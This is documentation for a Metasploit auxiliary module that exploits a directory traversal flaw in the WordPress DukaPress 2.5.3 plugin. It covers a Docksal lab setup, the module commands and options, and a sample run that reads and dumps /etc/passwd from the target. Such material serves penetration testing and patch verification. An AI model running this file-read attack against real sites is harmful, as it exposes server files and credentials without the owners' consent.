## Description

This module exploits a directory traversal vulnerability in WordPress Plugin
"DukaPress" version 2.5.3, allowing to read arbitrary files with the
web server privileges.

## Vulnerable Application

### Wordpress with installed DukaPress <= 2.5.3
* [https://wordpress.org/plugins/dukapress](https://wordpress.org/plugins/dukapress)
* [Plugin v2.5.3](https://downloads.wordpress.org/plugin/dukapress.2.5.3.zip)

### Setup using Docksal
Install [Docksal](https://docksal.io/)

Create a new Wordpress installation using `fin project create`

```
fin project create
1. Name your project (lowercase alphanumeric, underscore, and hyphen): msf-wp

2. What would you like to install?
  PHP based
    1.  Drupal 8
    2.  Drupal 8 (Composer Version)
    3.  Drupal 7
    4.  Wordpress
    5.  Magento
    6.  Laravel
    7.  Symfony Skeleton
    8.  Symfony WebApp
    9.  Grav CMS
    10. Backdrop CMS

  Go based
    11. Hugo

  JS based
    12. Gatsby JS
    13. Angular

  HTML
    14. Static HTML site

Enter your choice (1-14): 4

Project folder:   /home/weh/dev/msf-wp
Project software: Wordpress
Project URL:      http://msf-wp.docksal

Do you wish to proceed? [y/n]: y
Cloning repository...
Cloning into 'msf-wp'...
...
3. Installing site
 Step 1  Initializing stack...
Removing containers...
...
Starting services...
Creating network "msf-wp_default" with the default driver
Creating volume "msf-wp_cli_home" with default driver
Creating volume "msf-wp_project_root" with local driver
Creating volume "msf-wp_db_data" with default driver
Creating msf-wp_db_1  ... done
Creating msf-wp_cli_1 ... done
Creating msf-wp_web_1 ... done
Connected vhost-proxy to "msf-wp_default" network.
Waiting for project stack to become ready...
 Step 2  Initializing site...
 Step 2  Generating wp-config.php...
Success: Generated 'wp-config.php' file.
 Step 3  Installing site...
msmtp: envelope-from address is missing
Success: WordPress installed successfully.

Open http://msf-wp.docksal in your browser to verify the setup.
Admin panel: http://msf-wp.docksal/wp-admin. User/password: admin/admin  
 DONE!  Completed all initialization steps.
```

Download the wordpress plugin

```
cd msf-wp/wp-content/plugins
wget https://downloads.wordpress.org/plugin/dukapress.2.5.3.zip
unzip dukapress.2.5.3.zip

```

Login and click on DukaPress "Activate" Link

```
http://msf-wp.docksal/wp-admin/plugins.php
user: admin
pass: admin
```

## Verification Steps

1. Do: ```use auxiliary/scanner/http/wp_dukapress_file_read```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set VHOST [HOSTNAME]```
4. Do: ```run```

## Options

**FILEPATH**

The path to the file to read (default: `/etc/passwd`)

**DEPTH**

Traversal Depth (to reach the root folder) (default: `7`)


## Scenarios

### Wordpress 5.2 running in Docksal

Follow the Instructions above to setup the Docksal Containers.

````
msf5 > use auxiliary/scanner/http/wp_dukapress_file_read
msf5 > set RHOST msf-wp.docksal
RHOST => msf-wp.docksal
msf5 > set VHOST msf-wp.docksal
VHOST => msf-wp.docksal
msf5 > run

[*] Downloading file...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
docker:x:1000:1000::/home/docker:/bin/bash

[+] File saved in: /home/weh/.msf4/loot/20191009203058_default_192.168.64.100_dukapress.file_560342.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
